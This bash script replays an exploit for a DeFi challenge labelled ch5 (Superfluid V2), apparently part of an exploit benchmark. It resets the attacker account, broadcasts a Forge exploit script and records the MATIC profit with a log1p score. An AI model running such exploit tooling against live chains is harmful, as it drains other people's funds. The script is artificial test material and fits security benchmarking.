#!/usr/bin/env bash
# Optimized ch5 replay: reset + multi-hop DAI routing
set -euo pipefail

cd "$(dirname "$0")/.."
ROOT="$(cd ../.. && pwd)"
source "$ROOT/.env"

RPC="$RPC_CH5_SUPERFLUID_V2"
ATTACKER="$PUBLIC_ADDRESS"
KEYSTORE="runs/keystore/ch5tmp"
PASSFILE="runs/.ch5_keystore_password"
RUN_ID=$(date +%s)
LOG="runs/exploit_${RUN_ID}.log"

log() { echo "$1" | tee -a "$LOG"; }

# Pre-flight
log "=== optimized replay $RUN_ID $(date -u +%Y-%m-%dT%H:%M:%SZ) ==="

CHAIN_ID=$(cast chain-id --rpc-url "$RPC")
BLOCK=$(cast block-number --rpc-url "$RPC")
NONCE=$(cast nonce "$ATTACKER" --rpc-url "$RPC")
BALANCE=$(cast balance "$ATTACKER" --rpc-url "$RPC")
log "pre_chain_id=$CHAIN_ID pre_block=$BLOCK pre_nonce=$NONCE pre_balance=$BALANCE"

# Reset if nonce > 0 or balance != 10 MATIC
if [ "$NONCE" != "0" ] || [ "$BALANCE" != "10000000000000000000" ]; then
  log "Resetting ch5 (nonce=$NONCE, balance=$BALANCE)..."
  "$ROOT/tools/reset.sh" ch5
  sleep 3

  # Verify reset
  NONCE=$(cast nonce "$ATTACKER" --rpc-url "$RPC")
  BALANCE=$(cast balance "$ATTACKER" --rpc-url "$RPC")
  log "post_reset: nonce=$NONCE balance=$BALANCE"

  if [ "$NONCE" != "0" ]; then
    log "ERROR: reset did not clear nonce (got $NONCE)"
    exit 1
  fi
fi

# Save preflight
cat > "runs/exploit_${RUN_ID}_preflight.json" <<EOFPRE
{
  "run_id": $RUN_ID,
  "chain_id": $CHAIN_ID,
  "block": $BLOCK,
  "nonce": $NONCE,
  "balance_wei": "$BALANCE",
  "optimization": "multi-hop DAI routing (DAI->USDC->WMATIC)",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
}
EOFPRE

# Run the optimized forge script
log "Starting forge script (run function)..."
forge script exploit/Run.s.sol:Run \
  --sig "run()" \
  --broadcast \
  --rpc-url "$RPC" \
  --keystore "$KEYSTORE" \
  --password-file "$PASSFILE" \
  -vvv 2>&1 | tee -a "$LOG"

# Post-flight
POST_BALANCE=$(cast balance "$ATTACKER" --rpc-url "$RPC")
POST_NONCE=$(cast nonce "$ATTACKER" --rpc-url "$RPC")
DELTA=$((POST_BALANCE - 10000000000000000000))

log "post_balance=$POST_BALANCE post_nonce=$POST_NONCE delta=$DELTA"

# Save postflight
python3 -c "
import json, math
post_bal = int('$POST_BALANCE')
pre_bal = 10000000000000000000
delta = post_bal - pre_bal
matic = delta / 1e18
print(json.dumps({
    'run_id': $RUN_ID,
    'optimization': 'multi-hop DAI (DAI->USDC->WMATIC)',
    'pre_balance_wei': str(pre_bal),
    'post_balance_wei': str(post_bal),
    'delta_wei': str(delta),
    'delta_matic': round(matic, 2),
    'post_nonce': int('$POST_NONCE'),
    'timestamp': '$(date -u +%Y-%m-%dT%H:%M:%SZ)',
    'log1p_matic': round(math.log1p(matic), 4)
}, indent=2))
" > "runs/exploit_${RUN_ID}_postflight.json"

cat "runs/exploit_${RUN_ID}_postflight.json"

log "=== optimized replay complete ==="
